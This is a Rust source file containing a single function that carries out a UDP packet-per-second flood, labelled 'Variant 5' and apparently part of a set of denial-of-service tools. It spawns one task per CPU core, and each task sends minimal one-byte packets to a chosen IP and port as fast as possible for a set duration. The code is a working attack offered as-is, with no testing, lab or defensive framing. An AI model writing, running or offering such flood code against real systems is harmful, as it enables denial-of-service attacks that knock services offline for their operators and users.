use std::sync::Arc;
use tokio::net::UdpSocket;
use tokio::time::Instant;

// Variant 5: High-PPS Flood
pub async fn pps_flood(target_ip: &str, target_port: u16, duration_secs: u64) {
    let start_time = Instant::now();
    let socket = match UdpSocket::bind("0.0.0.0:0").await {
        Ok(s) => Arc::new(s),
        Err(_) => return,
    };

    let target = format!("{}:{}", target_ip, target_port);
    let buf = [0u8; 1]; // Minimal packet

    println!("Starting PPS Flood on {}", target);

    let mut handles = vec![];
    for _ in 0..num_cpus::get() {
        let socket_clone = socket.clone();
        let target_clone = target.clone();
        
        handles.push(tokio::spawn(async move {
            while start_time.elapsed().as_secs() < duration_secs {
                let _ = socket_clone.send_to(&buf, &target_clone).await;
                // No sleep. Max speed.
            }
        }));
    }

    for h in handles {
        let _ = h.await;
    }
}
